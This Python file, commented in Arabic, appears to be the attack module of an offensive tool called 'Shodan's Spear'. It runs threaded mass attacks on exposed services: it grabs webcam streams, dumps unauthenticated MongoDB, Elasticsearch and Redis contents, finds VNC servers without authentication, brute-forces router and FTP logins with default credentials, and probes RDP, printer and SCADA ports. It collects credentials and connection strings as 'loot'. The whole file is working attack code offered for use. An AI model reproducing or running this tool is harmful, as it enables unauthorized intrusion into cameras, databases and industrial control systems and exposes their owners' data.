#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ᚺᚾᛉᚲᛏ Shodan's Spear - محرك الهجوم الآلي
نظام الهجوم متعدد النواقل والاستغلال التلقائي
"""

import socket
import requests
import ftplib
import telnetlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple
import time
import random
from config import *

class Attacker:
    """
    محرك الهجوم - نظام الاستغلال الآلي متعدد النواقل
    """
    
    def __init__(self, max_threads: int = None):
        """
        تهيئة محرك الهجوم
        
        Args:
            max_threads: عدد الخيوط المتزامنة
        """
        self.max_threads = max_threads or MAX_THREADS
        self.stats = {
            "total_attacks": 0,
            "successful_attacks": 0,
            "failed_attacks": 0,
            "timeouts": 0
        }
        
        # إعداد الجلسة
        self.session = requests.Session()
        if USE_RANDOM_USER_AGENT:
            self.session.headers.update({
                'User-Agent': random.choice(USER_AGENTS)
            })
    
    def attack_target(self, target: Dict) -> Dict:
        """
        مهاجمة هدف واحد بناءً على نوعه
        
        Args:
            target: معلومات الهدف
        
        Returns:
            نتيجة الهجوم
        """
        self.stats["total_attacks"] += 1
        
        attack_type = target.get("attack_type", "unknown")
        
        # اختيار نوع الهجوم المناسب
        attack_methods = {
            "webcam": self._attack_webcam,
            "mongodb": self._attack_mongodb,
            "elasticsearch": self._attack_elasticsearch,
            "vnc": self._attack_vnc,
            "rdp": self._attack_rdp,
            "router": self._attack_router,
            "ftp": self._attack_ftp,
            "printer": self._attack_printer,
            "scada": self._attack_scada,
            "redis": self._attack_redis
        }
        
        attack_method = attack_methods.get(attack_type, self._attack_generic)
        
        try:
            result = attack_method(target)
            
            if result["success"]:
                self.stats["successful_attacks"] += 1
                target["status"] = "success"
                target["loot"] = result.get("loot")
                print(f"{Colors.GREEN}{Icons.SUCCESS} [{target['ip']}] اختراق ناجح!{Colors.RESET}")
            else:
                self.stats["failed_attacks"] += 1
                target["status"] = "failed"
                print(f"{Colors.RED}{Icons.FAILED} [{target['ip']}] فشل الهجوم{Colors.RESET}")
            
            return result
            
        except socket.timeout:
            self.stats["timeouts"] += 1
            self.stats["failed_attacks"] += 1
            target["status"] = "failed"
            return {"success": False, "error": "timeout"}
        except Exception as e:
            self.stats["failed_attacks"] += 1
            target["status"] = "failed"
            return {"success": False, "error": str(e)}
    
    def attack_multiple(self, targets: List[Dict], progress_callback=None) -> List[Dict]:
        """
        مهاجمة أهداف متعددة بشكل متزامن
        
        Args:
            targets: قائمة الأهداف
            progress_callback: دالة لتحديث التقدم
        
        Returns:
            قائمة نتائج الهجمات
        """
        results = []
        
        print(f"\n{Colors.BOLD}{Colors.BRIGHT_RED}{'═' * 60}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BRIGHT_RED}{Icons.SKULL} بدء الهجوم الآلي على {len(targets)} هدف{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BRIGHT_RED}{'═' * 60}{Colors.RESET}\n")
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            future_to_target = {
                executor.submit(self.attack_target, target): target 
                for target in targets
            }
            
            completed = 0
            for future in as_completed(future_to_target):
                target = future_to_target[future]
                try:
                    result = future.result()
                    results.append(result)
                    completed += 1
                    
                    if progress_callback:
                        progress_callback(completed, len(targets))
                    
                except Exception as e:
                    print(f"{Colors.RED}{Icons.FAILED} خطأ في معالجة {target['ip']}: {str(e)}{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}{Colors.GREEN}{Icons.SUCCESS} اكتمل الهجوم!{Colors.RESET}")
        print(f"{Colors.GREEN}   الناجح: {self.stats['successful_attacks']}{Colors.RESET}")
        print(f"{Colors.RED}   الفاشل: {self.stats['failed_attacks']}{Colors.RESET}\n")
        
        return results
    
    # ═══════════════════════════════════════════════════════════
    # طرق الهجوم المتخصصة
    # ═══════════════════════════════════════════════════════════
    
    def _attack_webcam(self, target: Dict) -> Dict:
        """هجوم على كاميرات الويب"""
        ip = target["ip"]
        port = target.get("port", 8080)
        
        # مسارات شائعة لبث الكاميرات
        common_paths = [
            "/video.mjpg",
            "/video.cgi",
            "/videostream.cgi",
            "/mjpg/video.mjpg",
            "/video/mjpg.cgi",
            "/cam_1.cgi",
            "/video",
            "/stream",
            "/live",
            "/axis-cgi/mjpg/video.cgi"
        ]
        
        for path in common_paths:
            try:
                url = f"http://{ip}:{port}{path}"
                response = self.session.get(url, timeout=CONNECTION_TIMEOUT, stream=True)
                
                if response.status_code == 200:
                    # تحقق من نوع المحتوى
                    content_type = response.headers.get('Content-Type', '')
                    if 'image' in content_type or 'video' in content_type or 'multipart' in content_type:
                        return {
                            "success": True,
                            "method": "webcam_stream",
                            "loot": {
                                "url": url,
                                "type": "webcam",
                                "stream_url": url,
                                "content_type": content_type
                            }
                        }
            except:
                continue
        
        return {"success": False, "error": "no_stream_found"}
    
    def _attack_mongodb(self, target: Dict) -> Dict:
        """هجوم على قواعد بيانات MongoDB"""
        try:
            from pymongo import MongoClient
            
            ip = target["ip"]
            port = target.get("port", 27017)
            
            # محاولة الاتصال بدون مصادقة
            client = MongoClient(
                ip, 
                port, 
                serverSelectionTimeoutMS=CONNECTION_TIMEOUT * 1000,
                connectTimeoutMS=CONNECTION_TIMEOUT * 1000
            )
            
            # محاولة الحصول على قائمة قواعد البيانات
            db_names = client.list_database_names()
            
            # جمع معلومات عن قواعد البيانات
            databases_info = []
            for db_name in db_names[:5]:  # أول 5 قواعد بيانات فقط
                db = client[db_name]
                collections = db.list_collection_names()
                databases_info.append({
                    "name": db_name,
                    "collections": collections[:10]  # أول 10 مجموعات
                })
            
            client.close()
            
            return {
                "success": True,
                "method": "mongodb_no_auth",
                "loot": {
                    "type": "database",
                    "db_type": "mongodb",
                    "databases": databases_info,
                    "connection_string": f"mongodb://{ip}:{port}/"
                }
            }
            
        except ImportError:
            return {"success": False, "error": "pymongo_not_installed"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _attack_elasticsearch(self, target: Dict) -> Dict:
        """هجوم على قواعد بيانات Elasticsearch"""
        ip = target["ip"]
        port = target.get("port", 9200)
        
        try:
            # محاولة الوصول إلى API
            url = f"http://{ip}:{port}/"
            response = self.session.get(url, timeout=CONNECTION_TIMEOUT)
            
            if response.status_code == 200:
                info = response.json()
                
                # محاولة الحصول على قائمة الفهارس
                indices_url = f"http://{ip}:{port}/_cat/indices?format=json"
                indices_response = self.session.get(indices_url, timeout=CONNECTION_TIMEOUT)
                
                indices = []
                if indices_response.status_code == 200:
                    indices = indices_response.json()[:10]  # أول 10 فهارس
                
                return {
                    "success": True,
                    "method": "elasticsearch_open",
                    "loot": {
                        "type": "database",
                        "db_type": "elasticsearch",
                        "version": info.get("version", {}).get("number"),
                        "cluster_name": info.get("cluster_name"),
                        "indices": indices,
                        "url": url
                    }
                }
        except Exception as e:
            return {"success": False, "error": str(e)}
        
        return {"success": False, "error": "connection_failed"}
    
    def _attack_vnc(self, target: Dict) -> Dict:
        """هجوم على خوادم VNC"""
        ip = target["ip"]
        port = target.get("port", 5900)
        
        try:
            # محاولة الاتصال بـ VNC
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(CONNECTION_TIMEOUT)
            sock.connect((ip, port))
            
            # قراءة رسالة الترحيب
            greeting = sock.recv(12).decode('ascii', errors='ignore')
            
            if greeting.startswith('RFB'):
                # إرسال نسخة البروتوكول
                sock.send(greeting.encode())
                
                # قراءة أنواع الأمان المدعومة
                security_types_count = ord(sock.recv(1))
                
                if security_types_count == 0:
                    # لا يوجد أمان - اتصال مفتوح!
                    sock.close()
                    return {
                        "success": True,
                        "method": "vnc_no_auth",
                        "loot": {
                            "type": "remote_desktop",
                            "protocol": "vnc",
                            "ip": ip,
                            "port": port,
                            "authentication": "none",
                            "connection_string": f"vnc://{ip}:{port}"
                        }
                    }
                else:
                    security_types = sock.recv(security_types_count)
                    # 1 = None (no authentication)
                    if 1 in security_types:
                        sock.close()
                        return {
                            "success": True,
                            "method": "vnc_no_auth",
                            "loot": {
                                "type": "remote_desktop",
                                "protocol": "vnc",
                                "ip": ip,
                                "port": port,
                                "authentication": "none",
                                "connection_string": f"vnc://{ip}:{port}"
                            }
                        }
            
            sock.close()
            
        except Exception as e:
            return {"success": False, "error": str(e)}
        
        return {"success": False, "error": "authentication_required"}
    
    def _attack_rdp(self, target: Dict) -> Dict:
        """هجوم على خوادم RDP"""
        ip = target["ip"]
        port = target.get("port", 3389)
        
        # محاولة الاتصال للتحقق من توفر الخدمة
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(CONNECTION_TIMEOUT)
            result = sock.connect_ex((ip, port))
            sock.close()
            
            if result == 0:
                # الخدمة متاحة - محاولة كلمات المرور الافتراضية
                # ملاحظة: هذا يتطلب مكتبة متخصصة مثل rdpy أو freerdp
                # نكتفي بالإبلاغ عن توفر الخدمة
                return {
                    "success": True,
                    "method": "rdp_available",
                    "loot": {
                        "type": "remote_desktop",
                        "protocol": "rdp",
                        "ip": ip,
                        "port": port,
                        "note": "الخدمة متاحة - يتطلب أدوات متخصصة للاختراق الكامل",
                        "connection_string": f"rdp://{ip}:{port}"
                    }
                }
        except Exception as e:
            return {"success": False, "error": str(e)}
        
        return {"success": False, "error": "connection_failed"}
    
    def _attack_router(self, target: Dict) -> Dict:
        """هجوم على أجهزة التوجيه"""
        ip = target["ip"]
        port = target.get("port", 80)
        
        # محاولة تسجيل الدخول بكلمات المرور الافتراضية
        for username, password in DEFAULT_CREDENTIALS[:10]:  # أول 10 محاولات
            try:
                url = f"http://{ip}:{port}/login"
                
                # محاولة 1: Basic Auth
                response = self.session.get(
                    url, 
                    auth=(username, password),
                    timeout=CONNECTION_TIMEOUT
                )
                
                if response.status_code == 200:
                    return {
                        "success": True,
                        "method": "router_default_creds",
                        "loot": {
                            "type": "router",
                            "ip": ip,
                            "port": port,
                            "username": username,
                            "password": password,
                            "url": f"http://{ip}:{port}",
                            "auth_type": "basic"
                        }
                    }
                
                # محاولة 2: Form-based login
                login_data = {
                    "username": username,
                    "password": password,
                    "user": username,
                    "pass": password,
                    "login": "Login"
                }
                
                response = self.session.post(
                    url,
                    data=login_data,
                    timeout=CONNECTION_TIMEOUT
                )
                
                # تحقق من علامات النجاح
                if response.status_code == 200 and ("dashboard" in response.text.lower() or "admin" in response.text.lower()):
                    return {
                        "success": True,
                        "method": "router_default_creds",
                        "loot": {
                            "type": "router",
                            "ip": ip,
                            "port": port,
                            "username": username,
                            "password": password,
                            "url": f"http://{ip}:{port}",
                            "auth_type": "form"
                        }
                    }
                
            except:
                continue
        
        return {"success": False, "error": "no_default_creds_worked"}
    
    def _attack_ftp(self, target: Dict) -> Dict:
        """هجوم على خوادم FTP"""
        ip = target["ip"]
        port = target.get("port", 21)
        
        try:
            # محاولة تسجيل الدخول المجهول
            ftp = ftplib.FTP(timeout=CONNECTION_TIMEOUT)
            ftp.connect(ip, port)
            ftp.login()  # anonymous login
            
            # الحصول على قائمة الملفات
            files = []
            try:
                files = ftp.nlst()[:20]  # أول 20 ملف
            except:
                pass
            
            ftp.quit()
            
            return {
                "success": True,
                "method": "ftp_anonymous",
                "loot": {
                    "type": "ftp",
                    "ip": ip,
                    "port": port,
                    "username": "anonymous",
                    "files": files,
                    "connection_string": f"ftp://{ip}:{port}"
                }
            }
            
        except Exception as e:
            # محاولة كلمات المرور الافتراضية
            for username, password in DEFAULT_CREDENTIALS[:5]:
                try:
                    ftp = ftplib.FTP(timeout=CONNECTION_TIMEOUT)
                    ftp.connect(ip, port)
                    ftp.login(username, password)
                    
                    files = []
                    try:
                        files = ftp.nlst()[:20]
                    except:
                        pass
                    
                    ftp.quit()
                    
                    return {
                        "success": True,
                        "method": "ftp_default_creds",
                        "loot": {
                            "type": "ftp",
                            "ip": ip,
                            "port": port,
                            "username": username,
                            "password": password,
                            "files": files,
                            "connection_string": f"ftp://{username}:{password}@{ip}:{port}"
                        }
                    }
                except:
                    continue
        
        return {"success": False, "error": "authentication_failed"}
    
    def _attack_printer(self, target: Dict) -> Dict:
        """هجوم على الطابعات"""
        ip = target["ip"]
        port = target.get("port", 631)
        
        try:
            url = f"http://{ip}:{port}/"
            response = self.session.get(url, timeout=CONNECTION_TIMEOUT)
            
            if response.status_code == 200:
                return {
                    "success": True,
                    "method": "printer_open",
                    "loot": {
                        "type": "printer",
                        "ip": ip,
                        "port": port,
                        "url": url,
                        "note": "واجهة الطابعة متاحة"
                    }
                }
        except Exception as e:
            return {"success": False, "error": str(e)}
        
        return {"success": False, "error": "connection_failed"}
    
    def _attack_scada(self, target: Dict) -> Dict:
        """هجوم على أنظمة SCADA"""
        ip = target["ip"]
        port = target.get("port", 502)
        
        # تحذير: هذا خطير جداً!
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(CONNECTION_TIMEOUT)
            result = sock.connect_ex((ip, port))
            sock.close()
            
            if result == 0:
                return {
                    "success": True,
                    "method": "scada_available",
                    "loot": {
                        "type": "scada",
                        "ip": ip,
                        "port": port,
                        "warning": "⚠ نظام تحكم صناعي - استخدم بحذر شديد!",
                        "note": "الخدمة متاحة - يتطلب أدوات متخصصة"
                    }
                }
        except Exception as e:
            return {"success": False, "error": str(e)}
        
        return {"success": False, "error": "connection_failed"}
    
    def _attack_redis(self, target: Dict) -> Dict:
        """هجوم على خوادم Redis"""
        try:
            import redis
            
            ip = target["ip"]
            port = target.get("port", 6379)
            
            # محاولة الاتصال بدون مصادقة
            r = redis.Redis(
                host=ip, 
                port=port, 
                socket_timeout=CONNECTION_TIMEOUT,
                socket_connect_timeout=CONNECTION_TIMEOUT
            )
            
            # محاولة الحصول على معلومات
            info = r.info()
            keys_sample = []
            
            try:
                # محاولة الحصول على عينة من المفاتيح
                keys = r.keys()[:10]
                keys_sample = [k.decode() if isinstance(k, bytes) else k for k in keys]
            except:
                pass
            
            return {
                "success": True,
                "method": "redis_no_auth",
                "loot": {
                    "type": "database",
                    "db_type": "redis",
                    "ip": ip,
                    "port": port,
                    "version": info.get("redis_version"),
                    "keys_sample": keys_sample,
                    "connection_string": f"redis://{ip}:{port}"
                }
            }
            
        except ImportError:
            return {"success": False, "error": "redis_library_not_installed"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _attack_generic(self, target: Dict) -> Dict:
        """هجوم عام - محاولة الاتصال الأساسية"""
        ip = target["ip"]
        port = target.get("port", 80)
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(CONNECTION_TIMEOUT)
            result = sock.connect_ex((ip, port))
            sock.close()
            
            if result == 0:
                return {
                    "success": True,
                    "method": "port_open",
                    "loot": {
                        "type": "generic",
                        "ip": ip,
                        "port": port,
                        "note": "المنفذ مفتوح"
                    }
                }
        except Exception as e:
            return {"success": False, "error": str(e)}
        
        return {"success": False, "error": "connection_failed"}
    
    def get_stats(self) -> Dict:
        """الحصول على إحصائيات الهجوم"""
        return self.stats.copy()
